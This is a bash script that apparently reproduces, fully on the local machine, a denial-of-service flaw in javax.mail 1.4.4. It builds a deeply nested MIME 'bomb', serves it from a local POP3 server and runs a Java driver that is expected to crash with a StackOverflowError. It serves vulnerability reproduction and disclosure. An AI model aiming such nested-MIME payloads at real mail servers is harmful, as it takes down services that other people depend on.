#!/usr/bin/env bash
# End-to-end local PoC. No external hosts are contacted.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="$(mktemp -d)"; cd "$WORK"
VER="1.4.4"
NEST="${1:-6000}"       # MIME nesting depth
XSS="${2:-512k}"        # JVM thread stack size (emulates a server worker thread)

echo "[*] fetching javax.mail:mail:$VER from Maven Central"
curl -fsSL -o mail.jar "https://repo1.maven.org/maven2/javax/mail/mail/$VER/mail-$VER.jar"
curl -fsSL -o activation.jar "https://repo1.maven.org/maven2/javax/activation/activation/1.1.1/activation-1.1.1.jar"

echo "[*] generating bomb (nesting=$NEST)"
python3 "$HERE/src/gen_bomb.py" "$NEST" bomb.eml

echo "[*] starting local POP3 server"
python3 "$HERE/src/pop3d.py" bomb.eml > pop3d.log 2>&1 &
POP3_PID=$!
trap 'kill $POP3_PID 2>/dev/null || true' EXIT
for _ in $(seq 1 25); do grep -q listening pop3d.log && break; sleep 0.2; done
cat pop3d.log

echo "[*] compiling driver"
javac -cp "mail.jar:activation.jar" -d . "$HERE/src/MailIngestDos.java"

echo "[*] running ingestion (stack=$XSS) — expect StackOverflowError + non-zero exit"
set +e
java -Xss"$XSS" -cp ".:mail.jar:activation.jar" MailIngestDos
echo "[*] JVM exit code = $?"
